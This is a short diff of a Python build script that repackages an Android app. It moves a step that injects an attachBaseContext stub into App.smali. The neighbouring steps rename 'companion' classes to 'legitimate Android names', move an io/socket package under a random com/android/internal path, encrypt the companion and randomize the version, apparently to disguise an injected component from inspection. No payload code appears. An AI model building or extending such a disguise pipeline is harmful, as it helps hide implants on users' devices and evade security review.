@@ -2986,6 +2986,12 @@ def main():
     elif _phase12_only:
         print("  ⚡ PHASE12_ONLY=true — running PHASE_1 + PHASE_2 + PHASE_6, skipping ENCRYPT_COMPANION")
 
+    # ── PHASE_3 STEP_1B: Inject attachBaseContext stub into App.smali ────────
+    # Must run AFTER step_rename_smali (STEP_6) so pkg path is final,
+    # and BEFORE STEP_6A which renames App.smali to a random new filename.
+    with track("PHASE_3", "STEP_P3_1B", "Inject attachBaseContext stub into App.smali"):
+        step_inject_app_stub_smali(new_pkg)
+
     if not _phase1_only:
         with track("PHASE_6", "STEP_6A", "Rename companion classes to legitimate Android names"):
             class_rename_map = step_6a_rename_classes(new_pkg)
@@ -3007,12 +3013,6 @@ def main():
 
             with track("PHASE_6", "STEP_6E", "Round 2 Step 6E: Rename io/socket → com/android/internal/* (random)"):
                 step_6e_rename_socket_package(new_pkg)
-
-    # ── PHASE_3 STEP_1B: Inject attachBaseContext stub into App.smali ────────
-    # Must run AFTER all smali renames (STEP_6/6A/6C/6D/6E) so pkg path is
-    # final, and BEFORE STEP_9 (DEX rebuild) so stub is compiled into classes.dex.
-    with track("PHASE_3", "STEP_P3_1B", "Inject attachBaseContext stub into App.smali"):
-        step_inject_app_stub_smali(new_pkg)
 
     with track("PHASE_1", "STEP_8", "Restore apktool.yml with randomized version"):
         step_restore_apktool_yml(meta)
